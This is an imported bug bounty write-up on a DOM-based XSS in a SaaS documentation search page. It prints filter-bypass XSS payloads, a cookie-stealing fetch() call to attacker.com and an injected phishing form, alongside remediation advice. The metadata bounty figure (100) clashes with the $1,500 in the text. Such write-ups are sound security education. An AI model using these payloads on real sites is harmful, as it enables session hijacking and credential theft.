---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-10_dom-based-xss-bug-bounty-writeup.md
original_filename: 2019-11-10_dom-based-xss-bug-bounty-writeup.md
title: DOM-Based XSS | Bug Bounty Writeup
category: blogs
detected_topics:
- xss
- sso
- command-injection
- mfa
- automation-abuse
tags:
- imported
- blogs
- xss
- sso
- command-injection
- mfa
- automation-abuse
language: en
raw_sha256: e3373448bd79f83a0428dfb1315270550a8a7f638557f3691d289f50c1492671
text_sha256: dc0baa656b75e7347bf218c2cc29e79bd05461dab90248d0562b1386d11282fc
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# DOM-Based XSS | Bug Bounty Writeup

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-10_dom-based-xss-bug-bounty-writeup.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, mfa, automation-abuse
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `e3373448bd79f83a0428dfb1315270550a8a7f638557f3691d289f50c1492671`
- Text SHA256: `dc0baa656b75e7347bf218c2cc29e79bd05461dab90248d0562b1386d11282fc`


## Content

---
title: "DOM-Based XSS | Bug Bounty Writeup"
page_title: "DOM-Based XSS Bug Bounty Writeup - HacknPentest"
url: "https://hacknpentest.com/dom-based-xss-bug-bounty-writeup/"
final_url: "https://hacknpentest.com/dom-based-xss-bug-bounty-writeup/"
authors: ["HacknPentest (@HacknPentest)"]
bugs: ["DOM XSS"]
bounty: "100"
publication_date: "2019-11-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4953
---

# DOM-Based XSS Bug Bounty Writeup

September 05, 2019 xss bug-bounty web-security

DOM-based Cross-Site Scripting (XSS) is one of the trickier vulnerability classes to find, but it consistently pays well in bug bounty programs. Unlike reflected or stored XSS, DOM-based XSS happens entirely in the browser - the server never sees the malicious payload. This writeup walks through how I discovered a DOM XSS vulnerability during a bug bounty engagement, including the discovery process, payload development, and responsible disclosure.

## The Target

The target was a large SaaS platform with a public bug bounty program on HackerOne. I am keeping the company name redacted per their disclosure policy. The vulnerable endpoint was a search feature on their documentation portal.

The URL structure looked like this:
  
  
  https://docs.redacted.com/search?q=test&lang=en
  

At first glance, the search query parameter appeared to be properly sanitized in the server response. The HTML source showed the search term was encoded correctly. But the behavior in the browser told a different story.

## Discovery Through Source Analysis

I always start by reviewing JavaScript source files. Modern web applications are heavily client-side, and DOM XSS lives in the JavaScript. I opened the browser developer tools and started reading through the main JavaScript bundle.

The key to finding DOM XSS is identifying **sources** and **sinks**. A source is where user-controlled data enters the JavaScript (like `document.location`, `window.name`, or `document.referrer`). A sink is where that data gets used in a dangerous way (like `innerHTML`, `document.write`, or `eval`).

In the minified JavaScript, I found this pattern (reformatted for readability):
  
  
  var searchParams = new URLSearchParams(document.location.search);
  var query = searchParams.get('q');
  var langFilter = searchParams.get('lang');
  
  document.getElementById('search-heading').innerHTML =
  'Search results for: ' + query + ' (' + langFilter + ')';
  

There it was. The `document.location.search` (source) was being fed directly into `.innerHTML` (sink) without any sanitization. Both the `q` and `lang` parameters were vulnerable.

## Confirming the Vulnerability

My first test was a simple alert payload in the `q` parameter:
  
  
  https://docs.redacted.com/search?q=<img src=x onerror=alert(1)>&lang=en
  

The page rendered and the JavaScript executed, popping an alert box. The server was not involved in the vulnerability at all - the raw URL parameters were being parsed by client-side JavaScript and injected into the DOM.

## Hitting a Filter

When I tried a more standard payload with `<script>` tags, nothing happened:
  
  
  https://docs.redacted.com/search?q=<script>alert(1)</script>&lang=en
  

After investigation, I found that the application had a basic client-side filter that stripped `<script>` tags from the URL parameters before some operations. However, this filter was incomplete - it only matched the literal string `<script>` and `</script>`.

This is a common mistake. Developers implement blocklist-based filtering instead of proper output encoding, and there are countless ways to bypass blocklists.

## Bypassing the Filter

Since the filter only blocked `<script>` tags, any other HTML element with an event handler worked perfectly:

**Image tag with onerror:**
  
  
  <img src=x onerror=alert(document.domain)>
  

**SVG with onload:**
  
  
  <svg onload=alert(document.domain)>
  

**Details tag with ontoggle:**
  
  
  <details open ontoggle=alert(document.domain)>
  

I went with the `img` tag payload as it executes automatically without user interaction.

The `lang` parameter was also vulnerable with the same approach:
  
  
  https://docs.redacted.com/search?q=test&lang=<img src=x onerror=alert(document.cookie)>
  

## Crafting a Weaponized Payload

For the bug bounty report, I wanted to demonstrate real impact beyond a simple `alert()`. I crafted a payload that would steal the user's session cookie and send it to an attacker-controlled server:
  
  
  <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
  

URL-encoded for the full exploit URL:
  
  
  https://docs.redacted.com/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27https%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie)%22%3E&lang=en
  

I verified this worked against my own test account. The session cookie was transmitted to my controlled server, and I could use it to take over the session.

For extra impact demonstration, I also showed that the payload could modify page content to create a convincing phishing form:
  
  
  document.body.innerHTML='<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="email" placeholder="Email"><input name="pass" type="password" placeholder="Password"><button>Log In</button></form>';
  

## The Impact Assessment

DOM-based XSS on this endpoint had significant impact:

  * **Session hijacking** \- stealing httpOnly=false cookies
  * **Account takeover** \- using stolen sessions to access user accounts
  * **Phishing** \- replacing page content with fake login forms under the legitimate domain
  * **Data theft** \- reading sensitive information from the DOM after the user logs in
  * **Malware delivery** \- redirecting users to malicious downloads

The documentation portal shared the same domain and cookie scope as the main application, which increased the severity significantly.

## Writing the Report

A good bug bounty report makes the difference between a quick payout and weeks of back-and-forth. Here is the structure I used:

**Title** : DOM-based XSS in Documentation Search via innerHTML sink

**Severity** : High (CVSS 7.1)

**Description** : The search page at docs.redacted.com uses `innerHTML` to render user-controlled URL parameters, allowing DOM-based XSS.

**Steps to Reproduce** :

  1. Navigate to the following URL while logged in
  2. Observe the alert box executing in the context of the application
  3. Note that cookies are accessible to the payload

**Proof of Concept** : (included screenshot and video)

**Impact** : Session hijacking, account takeover, phishing under trusted domain

**Remediation** : Replace `innerHTML` with `textContent` for user-controlled values, or implement proper HTML encoding before DOM insertion.

## The Response and Payout

The security team triaged the report within 24 hours and confirmed the vulnerability the same day. They classified it as High severity and awarded a bounty of $1,500. The fix was deployed within a week - they replaced `innerHTML` with `textContent` for all user-controlled values and added Content Security Policy headers as a defense-in-depth measure.

## Lessons Learned

**For hunters:**

  * Always read the JavaScript source. DOM XSS cannot be found by automated scanners alone.
  * Look for the source-to-sink data flow. Tools like DOM Invader (part of Burp Suite) can help automate this.
  * Do not stop at `<script>` tag blocking. There are dozens of HTML elements with event handlers that can execute JavaScript.
  * Demonstrate real impact in your reports. An `alert(1)` might get accepted, but showing cookie theft or account takeover gets higher severity ratings and better payouts.

**For developers:**

  * Never use `innerHTML` with user-controlled data. Use `textContent` or `innerText` instead.
  * Implement Content Security Policy (CSP) headers to mitigate XSS impact.
  * Blocklist-based filtering always fails eventually. Use allowlist validation or proper encoding.
  * Treat all client-side data sources as untrusted, including URL parameters, fragment identifiers, and referrer values.

## Tools for Finding DOM XSS

If you want to hunt for DOM XSS in your own bug bounty programs, these tools will help:

  * **DOM Invader** (Burp Suite) - automated source and sink detection
  * **Browser DevTools** \- manual JavaScript analysis and breakpoint debugging
  * **RetireJS** \- identifies known-vulnerable JavaScript libraries
  * **Source map exploration** \- if source maps are exposed, you get readable code instead of minified bundles

DOM XSS is an underexplored area in many bug bounty programs precisely because it requires JavaScript analysis skills. Invest time in learning it and you will find vulnerabilities that other hunters miss.

HP

The HnP Team

Offensive Security Researchers

HacknPentest is a collective of penetration testers and bug bounty hunters sharing practical offensive security knowledge. Combined experience includes corporate red team engagements, bug bounty programs on HackerOne and Bugcrowd, and OSCP/OSCE certifications. All techniques demonstrated are for authorized testing and educational purposes only.
